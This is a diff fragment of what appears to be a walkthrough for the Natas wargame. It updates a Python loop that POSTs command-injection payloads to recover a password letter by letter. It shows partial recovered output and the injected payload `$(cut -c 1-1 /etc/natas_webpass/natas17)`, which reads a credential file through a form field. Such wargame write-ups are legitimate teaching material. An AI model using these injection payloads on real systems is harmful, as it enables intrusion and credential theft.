@@ -84,10 +84,16 @@ def get_common_letter(words_list):
 
 password = ""
 for i in range(1, PASSWORD_LENGTH+1):
-    res = post(url=URL, headers=HEADERS, data=DATA+quote(CHAR_EXTRACTION.format(i,i,PASSWORD_FILENAME)))
+    res = post(url=URL, headers=HEADERS, data=DATA+quote(CASE_INSENSITIVE_LETTER_EXTRACTION.format(i,i,PASSWORD_FILENAME)))
     password += get_common_letter(get_dictionary_words(res.text))
     print("password: " + password.ljust(32, "_"))
 ```
+
+Take the code above and copy it into a Python file. Run it, and you will get the following output:
+
+<img src="./6.png"></img>
+
+So these are the characters of the password in case insensitive form, where each underscore represents a place of a digit: `xkeuche_sbnkbvh_ru_ksib_uulmi_sd`
 
 # exstract spesific letter from password
 `$(cut -c 1-1 /etc/natas_webpass/natas17)`
